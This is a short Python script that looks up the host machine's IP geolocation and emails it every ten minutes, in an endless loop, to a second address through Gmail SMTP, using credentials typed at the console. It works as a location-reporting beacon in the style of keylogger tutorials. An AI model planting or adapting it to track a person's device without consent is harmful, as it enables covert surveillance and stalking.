import smtplib
import ipapi
import time
from threading import Semaphore, Timer
SEND_REPORT_EVERY = 600 # 10 minutes
# you will need to allow Less secure app access in gmail account
# https://myaccount.google.com/lesssecureapps
EMAIL_ADDRESS = str(input("Enter your email address :  ")) 
EMAIL_PASSWORD = str(input(("Enter your passwored : ")))
EMAIL_ADDRESS_2 = str(input("Enter the anther email address to send data to : "))
class where:
   # def __init__(self, interval):
    def sendmail(self, email, password, email22, message):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)

        server.starttls()

        server.login(email, password)

        # server.sendmail(email, email, message)
        server.sendmail(email, email22, message)
        server.quit()
    def data_in(self):
        while True:
            gi = ipapi.location(ip=None, key=None, field=None)
            d1=" "
            for key, val in gi.items():
                a = ('%s : %s' % (key, val))
                d1+=" "+a
            d1+=" copy the ip and  go to this site to get it on google map "
            d1+="https://www.ipvoid.com/ip-to-google-maps/"
            print(d1)
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, EMAIL_ADDRESS_2 ,d1)
            time.sleep(SEND_REPORT_EVERY)
if __name__ == "__main__":
    #data = where(interval=SEND_REPORT_EVERY)
    data=where()
    #data.start()
    data.data_in()
